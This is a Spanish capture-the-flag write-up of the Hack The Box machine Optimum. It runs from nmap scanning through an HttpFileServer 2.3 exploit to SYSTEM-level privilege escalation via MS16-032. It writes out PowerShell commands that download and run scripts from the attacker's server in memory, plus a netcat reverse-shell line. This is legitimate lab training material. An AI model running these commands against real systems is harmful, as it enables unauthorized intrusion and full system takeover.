
#  OPTIMUM MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/1.png)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.8 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.10.8 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/3.png)

## EXPLOTACION

veamos la pagina web:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/4.png)

no muestra nada interesante, tenemos la version del servidor web **httpfileserver 2.3**, veamos si encontramos algun exploit:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/5.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/6.png)

nos indica que debemos tener un servidor donde pueda descargar el netcat, nos movemos el netcat a nuestro directorio actual:

```bash
mv /usr/share/windows-resources/binaries/nc.exe .
python -m SimpleHTTPServer
```

ademas debemos modificar esta parte del script:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/7.png)

nos colocamos a la escucha segun lo que configuramos y debemos ejecutarlo multiples veces porque en una descarga el netcat y en otra nos da la shell:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/8.png)

podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/9.png)

### PASANDONOS A UNA POWERSHELL

vamos a pasarnos a una powershell porque es mucho mas manejable, ademas vamos a aprender muchas cosas. Vamos a usar el script de nishang **InvokePowerShellTCP** lo tenemos en la carpeta shell de su repositorio: [nishang](https://github.com/samratashok/nishang).

creamos una copia en nuestra carpeta de trabajo, en mi caso tengo el repositorio de nishang en **/opt**:

```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
```

lo editamos y vamos a colocar esta linea en la ultima parte del script:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/10.png)

esto lo hacemos porque vamos a cargar el script en la maquina windows en memoria, de modo que cargara el script y la ultima linea. Esta linea llama a una funcion que esta en el mismo script llamada Invoke-PowerShellTCP que nos da la conexion reversa, ademas configuramos la IP y el puerto.

Vamos a establecer un servidor en python donde esta el script y vamos a descargarlo desde windows ya que tenemos una cmd:

```bash
start /b powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/PS.ps1')
```

ponemos **start /b** para que lo ejecute en segundo plano porque se queda en espera y ya no podemos usar la cmd. Esta es la forma de cargar en memoria un recurso externo mediante powershell.

Estamos a la escucha en netcat y obtenemos nuestra powershell:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/11.png)

algo que debemos verificar a la hora de busacr exploits de kernel mediante wes-ng, watson, windows exploit suggester u otro es que la powershell debe estar en un proceso de la misma arquitectura del sistema operativo, s decir que si el sistema operativo es de 64 bits el proceso que os da la powershell debe ser igual de 64 bits. Esto porque a la hora de buscar exploit de kernel mediante el **systeminfo** no queremos que mnos de falsos positivos.

para comprobar esto hacemos lo siguiente en la powershell:

```bash

#verificar 64 bits

[Environment]::Is64BitOperatingSystem

[Environment]::Is64BitProcess

#verificar 32 bits

[Environment]::Is32BitOperatingSystem

[Environment]::Is32BitProcess
```

si ambos salen **True** es que el proceso es de la misma arquitectura que el sistema operativo y eso es lo que queremos. 

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/12.png)

en nuestro caso no salio igual, para solucionar esto debemos invocar nuevamente el script de nishang pero usando la ruta completa de powershell:

```bash
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/PS.ps1')
```

si comprobamos ahora si esta igual:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/13.png)

## ELEVACION DE PRIVILEGIOS

Para ver vias potenciales para escalar privilegios usare sherlock.ps1 de rastamouse [sherlock](https://github.com/rasta-mouse/Sherlock). Lo vamos a cargar en memoria pero esta vez desde la powershell, este script tiene una funcion que verifica todas las posibles vulnerabilidades llamada **Find-AllVulns**, como lo vamos a cargar en memoria debemos colocarlo al final del script:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/14.png)

y lo llamamos desde la powershell (montandonos un servidor en python donde esta el script)

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Sherlock.ps1')
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/15.png)

El que me funciono fue el **MS16-032**, encontre un script en powershell que permite ejecutar comandos como system. [MS16-032](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)

Nos muestra como debemos usarlo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/16.png)

una vez mas vamos a descargar el script y colocaremos ese ejemplo al final porque lo cargaremos en memoria, aclarar que la funcion se llama **Invoke-MS16032** y no como en el ejemplo **Invoke-MS16-032**

recordemos que ya pasamos el netcat (nc.exe) al equipo en la fase de explotacion y se encuentra en la ruta **C:\\Users\\kostas\\Desktop** asi que me mandare una cmd con netcat como system

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/17.png)

ahora nos colocamos en escucha en ese puerto y cargamos en memoria el script:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1')
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/18.png)

obtenemos una reverse shell como system y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/OPTIMUM/images/19.png)

### NOTA

Si vamos a querer una reverse powershell siempre ver que el proceso coincida con la arquitectura del sistma operativo.

Si vamos a cargar un script en memoria lo hacemos con:

```bash
IEX(New-Object Net.WebClient).downloadString('python server')
```

y debemos llamar a la funcion en la ultima linea o lo podemos concatenar de la siguiente manera:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1'); Invoke-MS16032 -Command "C:\Users\kostas\Desktop\nc.exe -e cmd 10.10.14.16 4646"
```